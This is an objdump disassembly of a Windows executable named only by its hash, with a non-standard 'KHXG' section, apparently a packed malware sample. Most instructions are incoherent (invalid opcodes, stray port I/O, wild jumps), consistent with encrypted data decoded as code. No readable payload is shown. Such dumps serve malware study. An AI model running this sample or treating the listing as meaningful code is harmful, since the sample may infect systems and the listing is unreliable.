
1c766fa73e8e9e642109da0a68d981f7e4219776fb6ed5f2a2a5b4c618237138.exe:     file format pei-i386


Disassembly of section KHXG:

00401000 <KHXG>:
  401000:	push   es
  401001:	cdq    
  401002:	sti    
  401003:	inc    DWORD PTR [eax+edx*1]
  401006:	inc    eax
  401007:	add    BYTE PTR [edx],cl
  401009:	push   es
  40100a:	push   ebx
  40100b:	je     0x40107f
  40100d:	imul   ebp,DWORD PTR [esi+0x67],0xd3000b58
  401014:	sub    eax,0x41ffb07
  401019:	or     ebx,DWORD PTR [ebx+esi*1]
  40101c:	sub    BYTE PTR [ebx],al
  40101e:	sub    al,0xb6
  401020:	pop    ecx
  401021:	ss dec ebp
  401023:	xor    BYTE PTR [esp+edx*8],ah
  401026:	xor    al,dh
  401028:	or     al,0x31
  40102a:	or     esi,DWORD PTR [edx+0x7ffe661]
  401030:	push   esp
  401031:	dec    edi
  401032:	bound  ebp,QWORD PTR [edx+0x65]
  401035:	arpl   WORD PTR [esp+eiz*2+0x10],si
  401039:	or     al,0x60
  40103b:	mov    dl,0xfd
  40103d:	xchg   edi,eax
  40103e:	inc    DWORD PTR [esi]
  401040:	push   ebx
  401041:	jns    0x4010b6
  401043:	je     0x4010aa
  401045:	ins    DWORD PTR es:[edi],dx
  401046:	jmp    DWORD PTR ds:0x411184
  40104c:	mov    eax,eax
  40104e:	pop    es
  40104f:	or     al,0x20
  401052:	or     DWORD PTR [esp+edi*2],0x78
  401056:	je     0x401078
  401058:	or     DWORD PTR [edx+esi*1],0xffffff98
  40105c:	jo     0x400ff2
  40105e:	or     DWORD PTR [edx+esi*1],0xffffffc8
  401062:	ins    BYTE PTR es:[edi],dx
  401063:	push   0x320c6064
  401068:	enter  0x5c20,0x58
  40106c:	push   esp
  40106d:	xor    cl,al
  40106f:	and    BYTE PTR [ebx-0x37b7b3b0],al
  401075:	and    BYTE PTR [ebx-0x6fbfbbf4],al
  40107b:	and    BYTE PTR [ebx+0x383c320c],al
  401081:	xor    al,0x83
  401083:	or     al,0x32
  401085:	enter  0xa4a8,0xa0
  401089:	xor    BYTE PTR [edx+esi*1],cl
  40108c:	enter  0x2c20,0xb8
  401090:	mov    ah,0x32
  401092:	enter  0x8320,0xb0
  401096:	sub    BYTE PTR [edi+edi*8],ah
  401099:	inc    DWORD PTR [esi-0x3b7cacc1]
  40109f:	mov    esp,0x54210abb
  4010a4:	call   0x44110af
  4010a9:	test   BYTE PTR [esp+0x2c],0x1
  4010ae:	je     0x4010b5
  4010b0:	movzx  ebx,WORD PTR [edx+esi*1-0x38]
  4010b5:	div    esi
  4010b7:	and    al,0x30
  4010b9:	mov    eax,ebx
  4010bb:	sbb    eax,DWORD PTR [ebx+ebx*2-0x3d]
  4010bf:	arpl   WORD PTR [eax],sp
  4010c1:	sbb    al,0xc8
  4010c3:	and    BYTE PTR [ebx+0x1014180c],al
  4010c9:	and    DWORD PTR [ebx+0x80c320c],eax
  4010cf:	add    al,0x9f
  4010d1:	retf   
  4010d2:	jg     0x4010cf
  4010d4:	hlt    
  4010d5:	mov    ebx,0x836e05e0
  4010da:	cmp    eax,DWORD PTR [eax]
  4010dc:	jne    0x401137
  4010de:	push   0x6a0644
  4010e3:	mov    al,0x89
  4010e5:	out    dx,al
  4010e6:	jg     0x401153
  4010e8:	das    
  4010e9:	or     BYTE PTR [ebx+0x716037c],al
  4010ef:	xor    eax,eax
  4010f1:	mov    DWORD PTR [esp],eax
  4010f4:	jmp    0x401146
  4010f6:	mov    edx,DWORD PTR [ecx]
  4010f8:	jg     0x401175
  4010fa:	fucomip st,st(6)
  4010fc:	mov    edx,DWORD PTR ds:0x10892cdc
  401102:	or     esp,DWORD PTR [ebx-0x2f74e4f6]
  401108:	add    edx,edx
  40110a:	mov    ecx,DWORD PTR [edi+edi*8-0x3]
  40110e:	std    
  40110f:	outs   dx,DWORD PTR ds:[esi]
  401110:	push   cs
  401111:	lea    edx,[ecx+edx*8+0x4]
  401115:	mov    DWORD PTR [esp+0x4],edx
  401119:	mov    eax,DWORD PTR [ebx]
  40111b:	or     ecx,DWORD PTR [ecx+0x1389070a]
  401121:	inc    eax
  401122:	cmp    eax,0xffffffde
  401125:	neg    BYTE PTR [edx-0x238a9b05]
  40112b:	mov    eax,DWORD PTR [ebx]
  40112d:	dec    esi
  40112e:	adc    eax,0x7033c03
  401133:	mov    ebx,0x51eb5b2d
  401138:	mov    eax,DWORD PTR [edx]
  40113a:	lds    ecx,FWORD PTR [ecx+ecx*4]
  40113d:	adc    al,BYTE PTR [eax+0x4]
  401140:	retf   
  401141:	mov    edx,0x53b6fdf7
  401146:	push   esi
  401147:	push   cs
  401148:	clc    
  401149:	mov    esi,edx
  40114b:	mov    ebx,eax
  40114d:	jg     0x40113f
  40114f:	xor    BYTE PTR [edi+0x4],bh
  401152:	mov    ebx,0x4597d8d
  401157:	jmp    0x401193
  401159:	mov    eax,DWORD PTR [esi]
  40115b:	dec    edi
  40115c:	inc    edx
  40115d:	add    DWORD PTR [esi+0x4],0x9cfdee09
  401164:	cmp    ecx,DWORD PTR [esp+edx*2]
  401167:	inc    esp
  401168:	push   ebx
  401169:	adc    al,0x24
  40116b:	xchg   ecx,eax
  40116c:	push   esp
  40116d:	mov    edi,0x58ccc6c5
  401172:	add    al,0x1e
  401174:	push   eax
  401175:	ins    DWORD PTR es:[edi],dx
  401176:	imul   esi,DWORD PTR [eax+0x5e5a5901],0xfffffff7
  40117d:	outs   dx,BYTE PTR ds:[esi]
  40117e:	fld    TBYTE PTR [ebx+0x63]
  401181:	pop    ecx
  401182:	adc    cl,BYTE PTR [ecx-0x5cef74d8]
  401188:	xor    DWORD PTR [esi-0x4dc508b5],esi
  40118e:	add    al,0xa4
  401190:	ds or  al,0x4a
  401193:	add    al,0xd9
  401195:	loopne 0x401176
  401197:	mov    cl,0xf6
  401199:	inc    esi
  40119a:	mov    ds:0x578f3306,eax
  40119f:	push   ebp
  4011a0:	aaa    
  4011a1:	fnstenv [esi-0x74090453]
  4011a7:	lock mov edi,esp
  4011aa:	jg     0x401135
  4011ac:	pop    es
  4011ad:	mov    eax,DWORD PTR [edx]
  4011af:	mov    ebx,0x2c433542
  4011b4:	pop    es
  4011b5:	fdivp  st(5),st
  4011b7:	mul    bh
  4011b9:	(bad)  
  4011ba:	jns    0x4011d3
  4011bc:	mov    edx,DWORD PTR [edx-0x6f]
  4011bf:	retf   0x2f8b
  4011c2:	add    ecx,DWORD PTR [ebp-0x72]
  4011c5:	cmp    ecx,eax
  4011c7:	jne    0x4011e1
  4011c9:	in     eax,dx
  4011ca:	fsubr  QWORD PTR [esi-0x29]
  4011cd:	sbb    DWORD PTR [ebp+0x4020d802],edi
  4011d3:	or     BYTE PTR ds:0x7b010c06,ch
  4011d9:	retf   
  4011da:	mov    esi,0x16eb2fbd
  4011df:	add    eax,DWORD PTR [ebx+edi*1]
  4011e2:	shl    BYTE PTR [ebp+0xf],1
  4011e5:	push   ds
  4011e6:	pop    ss
  4011e7:	mov    ds:0x3ffbfbdb,eax
  4011ec:	pop    es
  4011ed:	cmp    esi,DWORD PTR [edi]
  4011ef:	jne    0x40119f
  4011f1:	mov    edx,ebx
  4011f3:	mov    eax,esi
  4011f5:	sbb    bh,BYTE PTR [esp+eax*4-0x40]
  4011f9:	lock mov eax,0xa5677d59
  4011ff:	out    0x5a,al
  401201:	pop    ebp
  401202:	pop    edi
  401203:	lea    esp,[esi]
  401205:	xchg   eax,esi
  401207:	in     al,dx
  401208:	hlt    
  401209:	outs   dx,DWORD PTR ds:[esi]
  40120a:	outs   dx,BYTE PTR ds:[esi]
  40120b:	imul   ecx,ebp,0xffffff86
  40120e:	xor    ch,BYTE PTR [edx-0x49]
  401211:	push   es
  401212:	pop    edi
  401213:	outs   dx,DWORD PTR ds:[esi]
  401214:	jb     0x6faf81a0
  40121a:	sbb    eax,0x3e4f8b1f
  40121f:	add    ebx,DWORD PTR [edi+0x15]
  401222:	stc    
  401223:	add    edi,DWORD PTR [edx+0x64]
  401226:	fbstp  TBYTE PTR [edx+0x76]
  401229:	sbb    edi,DWORD PTR [esi-0x21]
  40122c:	jne    0x4011b5
  40122e:	and    DWORD PTR [edi+0x41010e8b],esp
  401234:	or     BYTE PTR [edi],al
  401236:	push   ss
  401237:	sub    DWORD PTR [esi+eax*1],ebp
  40123a:	and    DWORD PTR [ecx-0x39],0xffffffda
  40123e:	ret    0xc78
  401241:	dec    ebx
  401242:	push   esi
  401243:	pop    es
  401244:	sub    bl,0x4d
  401247:	xor    al,0xdd
  401249:	test   BYTE PTR [edi],0x7b
  40124c:	jne    0x401258
  40124e:	sub    bl,ch
  401250:	xor    ecx,DWORD PTR [ebx-0x6aa5fce6]
  401256:	pop    esp
  401257:	fnstsw WORD PTR [esi]
  401259:	out    dx,al
  40125a:	jbe    0x401258
  40125c:	retf   
  40125d:	mov    edi,DWORD PTR [edi+0x2e]
  401260:	add    edi,DWORD PTR [ebp+0xc]
  401263:	sub    edi,ebx
  401265:	mov    DWORD PTR [edx],ecx
  401267:	sub    ecx,eax
  401269:	jle    0x4012b3
  40126b:	or     al,0x8d
  40126d:	mov    ebx,0x331ec070
  401272:	push   es
  401273:	lods   al,BYTE PTR ds:[esi]
  401274:	jmp    0x40128e
  401276:	gs jmp 0x40128d
  401279:	xchg   edx,eax
  40127a:	mov    ch,0x37
  40127c:	fild   DWORD PTR [edx+0x3ba00613]
  401282:	jne    0xb4111e1
  401288:	mov    ebx,0xb619adb1
  40128d:	adc    ch,al
  40128f:	nop
  401290:	ret    
  401291:	mov    ebx,edx
  401293:	inc    edi
  401294:	xor    DWORD PTR [edi-0x148100a],0x7d0010ad
  40129e:	pop    es
  40129f:	mov    esi,0x810ceb06
  4012a4:	(bad)  
  4012a5:	and    al,0x9
  4012a7:	and    esi,0x4dff6c66
  4012ad:	sti    
  4012ae:	dec    DWORD PTR [ecx+0x16a0473]
  4012b4:	push   0x560b2000
  4012b9:	xor    DWORD PTR [ebx],0x5837f85c
  4012bf:	clc    
  4012c0:	mov    DWORD PTR [ebx],edi
  4012c2:	test   edi,edi
  4012c4:	je     0x4012e9
  4012c6:	sbb    bh,BYTE PTR [eax-0x488f6c1c]
  4012cc:	lock fmul DWORD PTR [esi]
  4012cf:	adc    esp,DWORD PTR [eax+eax*4]
  4012d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012d3:	outs   dx,DWORD PTR ds:[esi]
  4012d4:	push   eax
  4012d5:	es xchg cl,ah
  4012d8:	mov    al,0xc3
  4012da:	enter  0x632c,0x55
  4012de:	lods   al,BYTE PTR ds:[esi]
  4012df:	inc    eax
  4012e0:	mov    esi,0xe8e15fb1
  4012e5:	(bad)  
  4012e6:	pop    ecx
  4012e7:	pusha  
  4012e8:	push   0x4
  4012ea:	dec    edi
  4012eb:	push   0x4726550b
  4012f0:	jbe    0x4012b2
  4012f2:	push   edx
  4012f3:	jne    0x401314
  4012f5:	js     0x4012fb
  4012f7:	add    al,0x98
  4012f9:	test   eax,0xc4e24cd
  4012fe:	jbe    0x401285
  401300:	inc    edx
  401301:	inc    ebx
  401302:	mov    dl,0xdb
  401304:	lahf   
  401305:	call   0x1b4db153
  40130a:	mov    edi,0xff16c7a6
  40130f:	stc    
  401310:	leave  
  401311:	mov    DWORD PTR [esi+0xc],ebx
  401314:	stos   BYTE PTR es:[edi],al
  401315:	adc    BYTE PTR [esi],ch
  401317:	mov    esp,0x2c03851f
  40131c:	jno    0x401332
  40131e:	mov    eax,ds:0x6beb1e4b
  401323:	ins    DWORD PTR es:[edi],dx
  401324:	imul   edi,DWORD PTR [eax+0x1c],0x58c13a26
  40132b:	pop    esp
  40132c:	sbb    eax,0xd2859437
  401331:	jb     0x401385
  401333:	int    0x79
  401335:	add    edi,DWORD PTR [eax]
  401337:	adc    al,0x77
  401339:	inc    ebp
  40133a:	mov    dh,0xeb
  40133c:	push   ds
  40133d:	jbe    0x401351
  40133f:	or     BYTE PTR [ebx+0x7e],dh
  401342:	or     BYTE PTR [ecx],ah
  401344:	push   0x19680304
  401349:	popa   
  40134a:	cwde   
  40134b:	imul   ebx,ebx,0x6c
  40134e:	dec    esp
  40134f:	jbe    0x401364
  401351:	add    eax,0xee8ffe84
  401356:	fcmovnu st,st(1)
  401358:	xchg   DWORD PTR [ebp+0x5c70a9a],eax
  40135e:	rcr    BYTE PTR [ebp+0x1],0xa
  401362:	jge    0x4013d0
  401364:	mov    WORD PTR [ecx],cs
  401366:	ficom  WORD PTR [edi+0x6]
  401369:	mov    edi,0x8c75063b
  40136e:	mov    ss,ebx
  401370:	(bad)  
  401371:	aam    0xab
  401373:	pop    es
  401374:	dec    ebx
  401375:	or     al,0xd5
  401377:	adc    DWORD PTR [eax+0x7edbc6c9],edi
  40137d:	or     eax,0x47092ba3
  401382:	add    al,0xb9
  401384:	sbb    dh,al
  401386:	out    dx,eax
  401387:	leave  
  401388:	mov    ah,0xa9
  40138a:	dec    esp
  40138b:	call   0xd0b4a0b6
  401390:	jge    0x401394
  401392:	aaa    
  401393:	dec    edx
  401394:	scas   al,BYTE PTR es:[edi]
  401395:	lea    esi,[ebx-0x20]
  401398:	loope  0x40131b
  40139a:	loope  0x40136a
  40139c:	sbb    bh,BYTE PTR [esi+0x4c2a86b9]
  4013a2:	rcr    BYTE PTR [ecx+eax*4],1
  4013a5:	ret    0xfff
  4013a8:	cmp    eax,0xba9db3e2
  4013ad:	not    DWORD PTR [edx]
  4013af:	fisttp DWORD PTR [ebp+0x10]
  4013b2:	aad    0x9
  4013b4:	sub    esi,DWORD PTR [edx-0x2e]
  4013b7:	test   DWORD PTR [si-0x14],edi
  4013bb:	pop    es
  4013bc:	jmp    0x401419
  4013be:	push   es
  4013bf:	push   es
  4013c0:	mov    ebp,0x331b73b
  4013c5:	cmp    eax,DWORD PTR [ebp-0x61]
  4013c8:	in     eax,0x10
  4013ca:	jae    0x4013d2
  4013cc:	xor    ch,BYTE PTR [ebp-0xa]
  4013cf:	jge    0x40139e
  4013d1:	pop    ss
  4013d2:	adc    ah,dh
  4013d4:	jbe    0x401365
  4013d6:	adc    al,0x1d
  4013d8:	add    al,0xd6
  4013da:	(bad)  
  4013dc:	ret    
  4013dd:	jae    0x4013fe
  4013df:	mov    ss,WORD PTR [eax]
  4013e1:	retf   
  4013e2:	or     ebp,DWORD PTR [ebx]
  4013e4:	push   es
  4013e5:	push   eax
  4013e6:	adc    esp,edi
  4013e8:	sbb    ebp,ecx
  4013ea:	inc    ebx
  4013eb:	xor    eax,eax
  4013ed:	push   es
  4013ee:	jae    0x4013db
  4013f0:	(bad)  
  4013f2:	pop    es
  4013f3:	fdiv   QWORD PTR [eax+0x73ecc25]
  4013f9:	jne    0x401397
  4013fb:	rol    BYTE PTR [edi+0x1ec6c6bd],0x39
  401402:	pop    esp
  401403:	jmp    0x6cc3:0xe5b0c581
  40140a:	xor    cl,cl
  40140c:	test   DWORD PTR [ebp-0x43],ecx
  40140f:	add    DWORD PTR [ecx+0xd],eax
  401412:	fst    DWORD PTR [eax-0x43fca7b4]
  401418:	add    esp,DWORD PTR [esi-0x5]
  40141b:	mov    ecx,DWORD PTR [ebx+edi*4+0x73031b06]
  401422:	and    BYTE PTR [edi+0x90cec40],dh
  401428:	mov    bl,0x3
  40142a:	mov    dh,0x9e
  40142c:	add    bh,BYTE PTR [edx+0x261234b5]
  401432:	lahf   
  401433:	jnp    0x401413
  401435:	fcmove st,st(2)
  401437:	dec    eax
  401438:	xchg   ebx,edi
  40143a:	imul   edi,DWORD PTR [ebp+0x3fa21ff4],0xffffffc0
  401441:	arpl   di,di
  401443:	rcr    BYTE PTR [ecx],cl
  401445:	or     DWORD PTR [edi+0xc703b41],ecx
  40144b:	jg     0x401481
  40144d:	mov    ecx,ebx
  40144f:	cwde   
  401450:	mov    eax,eax
  401452:	scas   al,BYTE PTR es:[edi]
  401453:	pop    ds
  401454:	mov    ebx,0xfc0560d6
  401459:	stos   DWORD PTR es:[edi],eax
  40145a:	pop    edi
  40145b:	mov    ecx,DWORD PTR [edx+0x17]
  40145e:	add    ecx,ecx
  401460:	and    ecx,DWORD PTR [edi-0x31]
  401463:	sbb    al,0x7
  401465:	in     eax,dx
  401466:	pop    es
  401467:	inc    edi
  401468:	mov    eax,DWORD PTR [edi]
  40146a:	ja     0x4013fc
  40146c:	mov    ebx,0x68783ede
  401471:	das    
  401472:	jne    0x40142f
  401474:	add    al,0x58
  401476:	cmp    BYTE PTR [ecx+0x26e0674d],al
  40147c:	lea    eax,ds:0xc03c511
  401482:	outs   dx,BYTE PTR ds:[esi]
  401483:	xchg   DWORD PTR [edi+0x1b],ebp
  401486:	cmp    edx,DWORD PTR [edx+0x3025313]
  40148c:	pop    edi
  40148d:	xor    al,0x73
  40148f:	fidivr DWORD PTR [edx+0x21]
  401492:	sbb    esp,DWORD PTR [ebx]
  401494:	or     al,0x89
  401496:	or     al,0x8b
  401498:	cli    
  401499:	xor    dh,BYTE PTR [edx-0x2a]
  40149c:	rol    BYTE PTR [ecx+0x67],1
  40149f:	add    al,0xac
  4014a1:	(bad)  
  4014a2:	out    0x1b,eax
  4014a4:	aas    
  4014a5:	jmp    0x40150a
  4014a7:	out    0x6,eax
  4014a9:	push   cs
  4014aa:	cmp    ebp,DWORD PTR [esi]
  4014ac:	je     0x4014b5
  4014ae:	jmp    0xcea705ee
  4014b3:	cs jne 0x4014a5
  4014b6:	push   es
  4014b7:	pop    edi
  4014b8:	call   0xae7f:0xba9c8e0f
  4014bf:	(bad)  
  4014c0:	lods   al,BYTE PTR ds:[esi]
  4014c1:	mov    edx,edi
  4014c3:	sub    edx,DWORD PTR [eax-0x66]
  4014c6:	int    0xe
  4014c8:	add    eax,DWORD PTR [ecx+0xc]
  4014cb:	jns    0x4014d5
  4014cd:	push   edi
  4014ce:	mov    bl,0x3d
  4014d0:	clc    
  4014d1:	fwait
  4014d2:	mov    esp,0x10339d78
  4014d7:	ins    DWORD PTR es:[edi],dx
  4014d8:	sub    al,0xdf
  4014da:	jb     0x401535
  4014dc:	or     BYTE PTR [edi-0x74ea60f0],bl
  4014e2:	or     al,0x5
  4014e4:	adc    BYTE PTR ss:[ebx-0x36],bh
  4014e8:	mov    ds:0xb9d233f3,al
  4014ed:	mov    al,0x52
  4014ef:	jnp    0x4014a8
  4014f1:	jmp    0x429b1e01
  4014f6:	push   ebp
  4014f7:	push   ecx
  4014f8:	inc    esi
  4014f9:	int3   
  4014fa:	(bad)  
  4014fb:	add    BYTE PTR [ecx],bl
  4014fd:	xor    al,0xa1
  4014ff:	push   esp
  401500:	in     al,dx
  401501:	and    edi,DWORD PTR ds:0x52eb4ac2
  401507:	jl     0x401544
  401509:	fnsave [ebp+0x42]
  40150c:	scas   eax,DWORD PTR es:[edi]
  40150d:	adc    DWORD PTR [edx+0x73],ebx
  401510:	jo     0x401591
  401512:	cmp    esp,DWORD PTR [esi+edi*1]
  401515:	pop    eax
  401516:	jb     0x4014da
  401518:	pop    es
  401519:	fild   DWORD PTR [edi]
  40151b:	mov    eax,0x6b2e5738
  401520:	inc    eax
  401521:	js     0x401555
  401523:	and    eax,esi
  401525:	into   
  401526:	push   ss
  401527:	or     ch,BYTE PTR [ecx+0x10]
  40152a:	shl    BYTE PTR [edx],cl
  40152c:	sbb    BYTE PTR ds:0x64a75307,0xd8
  401533:	jo     0x40157b
  401535:	cmp    BYTE PTR [ebp+0x4ee13288],cl
  40153b:	add    edx,eax
  40153d:	mov    eax,0x91e9c49d
  401542:	shl    BYTE PTR [edi],0x3b
  401545:	xor    al,0x76
  401547:	pop    edi
  401548:	outs   dx,DWORD PTR ds:[esi]
  401549:	ja     0x4015ad
  40154b:	addr16 jmp 0x2a54405f
  401551:	dec    esp
  401552:	push   es
  401553:	mov    esp,0x3bebbddd
  401558:	pop    ebp
  401559:	xchg   edi,eax
  40155a:	hlt    
  40155b:	retf   0x268b
  40155e:	test   ebx,ebx
  401560:	je     0x401581
  401562:	ret    
  401563:	cmp    eax,0xc3c79366
  401568:	lds    esp,FWORD PTR [eax+0x38769ad2]
  40156e:	rcl    DWORD PTR [edx+ebp*8],0x7
  401572:	adc    al,0x3
  401574:	cmp    ebx,DWORD PTR [esp+ebx*2]
  401577:	or     al,0x4e
  401579:	xchg   esp,eax
  40157a:	jmp    0x4015e2
  40157c:	xchg   ebp,eax
  40157d:	xlat   BYTE PTR ds:[ebx]
  40157e:	inc    dh
  401580:	mov    bh,0xb
  401582:	cmp    ah,ch
  401584:	push   ecx
  401585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401586:	push   ebp
  401587:	push   0x64c01ac4
  40158c:	push   DWORD PTR [edx]
  40158e:	mov    DWORD PTR fs:[edx],esp
  401591:	lods   eax,DWORD PTR ds:[esi]
  401592:	adc    eax,0x280ad67e
  401597:	add    eax,edx
  401599:	cmp    BYTE PTR ds:0xb03f0ad1,0x49
  4015a0:	pusha  
  4015a1:	mov    dl,0xa
  4015a3:	adc    bl,al
  4015a5:	sbb    DWORD PTR [edi+ecx*2-0x4e],esi
  4015a9:	js     0x40153b
  4015ab:	fisttp QWORD PTR [ecx]
  4015ad:	and    BYTE PTR [esi],al
  4015af:	push   0xf460ff8
  4015b4:	outs   dx,DWORD PTR ds:[esi]
  4015b5:	outs   dx,DWORD PTR ds:[esi]
  4015b6:	ja     0x40155b
  4015b8:	sbb    al,0x15
  4015ba:	cmp    DWORD PTR ds:0xb8404105,0x3
  4015c1:	not    BYTE PTR ds:0x781fe06f
  4015c7:	or     eax,0x40f48222
  4015cc:	cmp    eax,0xec75aa01
  4015d1:	mov    DWORD PTR [ebp+0x27],0xfcdc342e
  4015d8:	add    al,0x14
  4015da:	cmp    ebx,DWORD PTR [ebp+edx*2-0x4]
  4015de:	mov    esp,0x6776eebd
  4015e3:	or     BYTE PTR [eax],dl
  4015e5:	pop    es
  4015e6:	mov    ds:0x5c61810,eax
  4015eb:	mov    esp,0xbdccafe1
  4015f0:	mov    ebp,0x59595ab1
  4015f5:	pushf  
  4015f6:	adc    BYTE PTR [eax-0x35],ch
  4015f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015fa:	xchg   edi,eax
  4015fb:	loopne 0x4015c0
  4015fd:	pop    esp
  4015fe:	loope  0x4015f7
  401600:	sbb    eax,0xebe82503
  401605:	in     eax,0xa0
  401607:	sub    eax,0xd76b5d59
  40160c:	out    dx,al
  40160d:	ret    0x266b
  401610:	ret    0xf29
  401613:	repz test al,ch
  401616:	jle    0x401678
  401618:	retf   
  401619:	jae    0x401686
  40161b:	inc    ebx
  40161c:	out    0xc8,al
  40161e:	sbb    esi,DWORD PTR [eax]
  401620:	and    ah,bl
  401622:	sbb    ebp,ecx
  401624:	cmp    eax,0xa1006b0b
  401629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40162a:	les    edi,FWORD PTR [eax-0x5303f7ce]
  401630:	pop    eax
  401631:	(bad)  
  401632:	sbb    BYTE PTR [ebp-0x8],al
  401635:	jmp    0x401652
  401637:	xchg   dh,bl
  401639:	dec    ebx
  40163a:	add    ch,BYTE PTR [ebp+0xb]
  40163d:	xchg   DWORD PTR [ebx],ecx
  40163f:	sbb    al,0x2e
  401641:	adc    ch,BYTE PTR [esi-0x6d]
  401644:	fadd   QWORD PTR [edi]
  401646:	jne    0x401623
  401648:	and    al,0xa1
  40164a:	call   0x48c47248
  40164f:	out    dx,eax
  401650:	cmp    DWORD PTR [ebp-0x4],0x0
  401654:	je     0x401677
  401656:	add    BYTE PTR [esi],bl
  401658:	fmul   st,st(4)
  40165a:	inc    ebp
  40165b:	push   eax
  40165c:	or     DWORD PTR [eax+eiz*1+0x75],esi
  401660:	fist   WORD PTR [edx]
  401662:	adc    cl,al
  401664:	leave  
  401665:	stc    
  401666:	iret   
  401667:	sbb    eax,DWORD PTR [ebx]
  401669:	popa   
  40166a:	neg    DWORD PTR ds:0x59dbe864
  401670:	call   DWORD PTR [ebx-0x3]
  401673:	cmp    eax,DWORD PTR ds:0x3de84141
  401679:	hlt    
  40167a:	jne    0x401685
  40167c:	add    BYTE PTR ds:0x3be3090a,dl
  401682:	ds lock push eax
  401685:	or     BYTE PTR [ecx+0x4e7f67fa],al
  40168b:	ins    BYTE PTR es:[edi],dx
  40168c:	jne    0x4016a5
  40168e:	test   edx,edx
  401690:	jns    0x40169f
  401692:	retf   
  401693:	jle    0x40169d
  401695:	jg     0x401659
  401697:	add    eax,ecx
  401699:	cli    
  40169a:	add    ah,BYTE PTR [ecx-0x140b6f61]
  4016a0:	dec    ebx
  4016a1:	push   ss
  4016a2:	xor    edi,DWORD PTR [eax-0x5f]
  4016a5:	fisttp WORD PTR [ebx+0x1c8b170d]
  4016ab:	sub    eax,0xc4f4915c
  4016b0:	ins    DWORD PTR es:[edi],dx
  4016b1:	or     BYTE PTR ds:0x86106d42,bl
  4016b7:	pop    ecx
  4016b8:	push   ss
  4016b9:	sub    eax,0x19ebd852
  4016be:	sbb    dl,dl
  4016c0:	iret   
  4016c1:	pop    edi
  4016c2:	test   al,0x6c
  4016c4:	jl     0x401717
  4016c6:	mov    ecx,esp
  4016c8:	add    esp,DWORD PTR [eax]
  4016ca:	inc    edx
  4016cb:	adc    ebx,ebp
  4016cd:	sbb    BYTE PTR [ebx-0x6448228b],cl
  4016d3:	adc    DWORD PTR [ebx],edi
  4016d5:	ret    0x9e72
  4016d8:	sbb    DWORD PTR [ebx],eax
  4016da:	push   ebx
  4016db:	or     al,0x8
  4016dd:	sbb    eax,0x2631211
  4016e2:	in     eax,dx
  4016e3:	mov    bh,0x19
  4016e5:	mov    edx,0xf9113b20
  4016ea:	cmp    eax,0x79ddc038
  4016ef:	(bad)  
  4016f0:	scas   eax,DWORD PTR es:[edi]
  4016f1:	add    DWORD PTR [ebx-0x35bca5ff],ecx
  4016f7:	sub    ecx,0x6f
  4016fa:	ja     0x4016bb
  4016fc:	mov    ebp,0x89011ce0
  401701:	pop    DWORD PTR [ebx+0x137c10fa]
  401707:	(bad)  
  401708:	mov    DWORD PTR [edx],0x8b802407
  40170e:	rcr    DWORD PTR ds:0x60db9bc,1
  401714:	push   cs
  401715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401716:	es pop ss
  401718:	add    al,0x7c
  40171a:	btc    ecx,ecx
  40171d:	loope  0x4016cd
  40171f:	popf   
  401720:	mov    edx,0xa3891602
  401725:	add    al,0x16
  401727:	inc    DWORD PTR ds:0x696e67ac
  40172d:	imul   edi,ebx,0x97ea83d0
  401733:	adc    dh,BYTE PTR [ebp-0x4]
  401736:	je     0x4017b7
  401738:	or     bh,ch
  40173a:	int    0x3d
  40173c:	loope  0x40173f
  40173e:	adc    eax,0x1441b0
  401743:	pop    edi
  401744:	cmp    cl,BYTE PTR [esp+edi*2]
  401747:	push   cs
  401748:	or     edx,0x2
  40174b:	xchg   edi,eax
  40174c:	mov    ebp,gs
  40174e:	ss mov dh,0xc0
  401751:	add    al,0x14
  401753:	or     al,0xe4
  401755:	dec    ebp
  401756:	or     al,BYTE PTR [ebx]
  401758:	je     0x40171b
  40175a:	push   ss
  40175b:	clc    
  40175c:	ret    0x2083
  40175f:	inc    bl
  401761:	sqrtps xmm1,XMMWORD PTR [eax+0x19]
  401765:	loope  0x401706
  401767:	inc    ecx
  401768:	loopne 0x401765
  40176a:	cmp    ecx,0x4f47405
  401770:	fiadd  DWORD PTR [ecx-0x412e9052]
  401776:	jecxz  0x4017dc
  401778:	sub    edx,DWORD PTR [edi+0x35]
  40177b:	adc    edi,esi
  40177d:	ret    0x78fe
  401780:	outs   dx,DWORD PTR ds:[esi]
  401781:	test   eax,0x51f61cd
  401786:	test   BYTE PTR [ecx],0xd6
  401789:	sub    DWORD PTR [ebp-0x68],eax
  40178c:	aam    0x42
  40178e:	dec    ebx
  40178f:	mov    esi,0x19c66372
  401794:	arpl   WORD PTR [ebp+0x8e916c3],bx
  40179a:	inc    ebx
  40179b:	push   es
  40179c:	add    BYTE PTR [ebx],cl
  40179e:	fbld   TBYTE PTR [ebx-0x2195ad2e]
  4017a4:	loop   0x401775
  4017a6:	ja     0x401780
  4017a8:	cli    
  4017a9:	idiv   DWORD PTR [ebx-0x5c09cc40]
  4017af:	test   eax,0x250b6d00
  4017b4:	pusha  
  4017b5:	add    esi,eax
  4017b7:	add    ebx,eax
  4017b9:	sbb    ah,BYTE PTR [esi+0x28]
  4017bc:	aaa    
  4017bd:	test   DWORD PTR [eax-0x5cceebfe],ebp
  4017c3:	add    eax,0x899c6fe
  4017c8:	sbb    al,BYTE PTR [ebx+0x5afafe23]
  4017ce:	push   ebx
  4017cf:	and    esi,eax
  4017d1:	mov    eax,ds:0x332cf403
  4017d6:	fist   DWORD PTR [edi]
  4017d8:	or     al,0xeb
  4017da:	sub    eax,0xf164a925
  4017df:	daa    
  4017e0:	(bad)  
  4017e1:	jb     0x401823
  4017e3:	out    dx,eax
  4017e4:	push   0xffffff86
  4017e6:	in     eax,dx
  4017e7:	js     0x4017eb
  4017e9:	mov    esi,0x8dd0d73f
  4017ef:	or     al,0x2e
  4017f1:	test   eax,0x2bc35bdb
  4017f6:	rcr    DWORD PTR [ecx],1
  4017f8:	jg     0x4017e8
  4017fa:	lock sub esi,ebp
  4017fd:	xor    eax,0xb0dcc72b
  401802:	adc    eax,0x7d0c7b18
  401807:	push   ss
  401808:	sub    ch,dl
  40180a:	enter  0xd624,0xc3
  40180e:	data16 (bad) 
  401810:	xlat   BYTE PTR ds:[ebx]
  401811:	fadd   st,st(7)
  401813:	dec    ebx
  401814:	or     DWORD PTR [ebp+eiz*4+0xa],esp
  401818:	(bad)  
  401819:	sbb    BYTE PTR [ebx],al
